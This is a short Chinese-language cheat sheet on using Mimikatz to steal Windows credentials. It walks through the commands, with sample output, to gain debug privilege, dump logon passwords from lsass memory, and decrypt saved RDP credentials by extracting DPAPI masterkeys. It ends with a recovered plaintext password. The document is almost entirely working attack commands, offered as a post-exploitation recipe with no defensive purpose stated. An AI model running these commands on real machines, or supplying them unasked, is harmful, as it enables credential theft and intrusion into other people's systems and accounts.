# Mimikatz
家喻户晓的工具Mimikatz可以dump凭据,也就是hash,可以在gentilwiki的github主页找到最新的编译好的利用文件。

Mimikatz的运行需要管理员权限，它可以从administrator权限提升到system权限。

```
mimikatz # privilege::debug

Privilege '20' OK
```

## Dumping creds from lsass

```
mimikatz # sekurlsa::logonpasswords
```

## DPAPI方法

有些用户在进行3389连接的时候，会选择把密码保存在本地的选项。
凭据通常存储在以下两个目录中的文件中：

```
dir /a C:\Users\username\AppData\Roaming\Microsoft\Credentials 
C:\Users\username\AppData\Local\Microsoft\Credentials
```
如果两个文件夹都是空的，那么凭证可能不会保存在凭证管理器中。这些文件通常存储为32个字符全部大写字母的数字字符串，类似于：`0DCF46D87F2DCE439DC47AA5F9267462`。

获得凭据文件的文件名和路径后，用mimikatz执行:


```
mimikatz dpapi::cred /in:C:\Users\username\AppData\Local\Microsoft\Credentials\0DCF46D87F2DCE439DC47AA5F9267462  //dump我们想要解密的凭据blob以及解密所需的masterkey的GUID。
```

SYSTEM可以dump所有的masterkeys：

```
!sekurlsa::dpapi
```
在上一步中，你应该获得了一个129字符的字符串，这是作为与找到的GUID相关联的masterkey。

```
GUID: {6515c6ef-60cd-4563-a3d5-3d70a6bc699}
masterkey: 76081ac6e809573b4dfa1a7a8eac3ae0106aa3f4d283fc3d6cf114a6285b582d4df53dc0e30b64c318e473bce49adabb73ad8cccd8bf4d7d10f44f4d4e48cf04
```
继续使用masterkey解密凭据。

```
 dpapi::cred /in:C:\Users\username\AppData\Local\Microsoft\Credentials\0DCF46D87F2DCE439DC47AA5F9267462/masterkey:76081ac6e809573b4dfa1a7a8eac3ae0106aa3f4d283fc3d6cf114a6285b582d4df53dc0e30b64c318e473bce49adabb73ad8cccd8bf4d7d10f44f4d4e48cf04
```

会回显出用户名和密码:

```
UserName       : LAN\username_adm
CredentialBlob : Sup3rAw3s0m3Passw0rd!
```


```
参考链接:https://github.com/gentilkiwi/mimikatz/wiki/module-~-dpapi https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/​
```





